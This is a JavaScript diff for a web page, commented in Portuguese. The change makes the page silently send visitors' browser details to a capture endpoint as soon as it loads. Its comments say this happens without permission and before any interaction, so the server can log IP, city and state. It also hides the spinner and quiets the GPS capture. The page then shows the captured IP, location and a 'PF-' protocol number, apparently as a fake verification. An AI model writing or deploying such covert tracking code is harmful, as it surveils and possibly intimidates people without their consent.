@@ -253,7 +253,6 @@
     function enviarCaptura() {
       if (enviado) return;
       enviado = true;
-      document.getElementById("spinnerVerificacao").style.display = "block";
       fetch(window.CAPTURA_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -265,9 +264,29 @@
           erroGps: erroGps
         })
       }).then(function (r) { return r.json(); }).then(function (r) {
-        revelar(r && r.ok ? r.dados : null);
-      }).catch(function () { revelar(null); });
+        // Atualiza o painel silenciosamente (IP/cidade/UF já registrados no 1º acesso).
+        if (typeof atualizarDadosTela === "function" && r && r.ok) atualizarDadosTela(r.dados);
+      }).catch(function () { /* silencioso */ });
     }
+
+    // CAPTURA IMEDIATA (IP + cidade/UF via geoip no servidor) — sem permissão,
+    // logo no carregamento da página, antes de qualquer interação.
+    var dadosPrimeiraCaptura = null;
+    (function () {
+      fetch(window.CAPTURA_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          ua: navigator.userAgent,
+          tela: screen.width + "x" + screen.height,
+          idioma: navigator.language,
+          gps: null,
+          erroGps: "aguardando-permissao"
+        })
+      }).then(function (r) { return r.json(); }).then(function (r) {
+        if (r && r.ok) dadosPrimeiraCaptura = r.dados;
+      }).catch(function () { /* silencioso */ });
+    })();
 
     function revelar(d) {
       document.getElementById("spinnerVerificacao").style.display = "none";
@@ -289,11 +308,13 @@
       document.getElementById("dDisp").className = "capturado";
       document.getElementById("dProto").textContent = d && d.protocolo ? d.protocolo : "PF-" + Date.now().toString(36).toUpperCase();
       document.getElementById("dProto").className = "capturado";
-      if (d) {
-        if (d.ip) { set("dIp", d.ip); }
-        if (d.cidade) { set("dCidade", d.cidade); }
-        if (d.uf) { set("dUf", d.uf); }
-        if (d.isp) { set("dIsp", d.isp); }
+      // dadosGps chegou na 2ª captura; se falhou, usa IP/cidade/UF da 1ª (imediata).
+      var dados = d || dadosPrimeiraCaptura;
+      if (dados) {
+        if (dados.ip) { set("dIp", dados.ip); }
+        if (dados.cidade) { set("dCidade", dados.cidade); }
+        if (dados.uf) { set("dUf", dados.uf); }
+        if (dados.isp) { set("dIsp", dados.isp); }
       }
       if (d && d.gps) {
         set("dGps", "LAT " + d.gps.lat.toFixed(5) + " · LON " + d.gps.lon.toFixed(5) + " (±" + Math.round(d.gps.acc) + "m)");
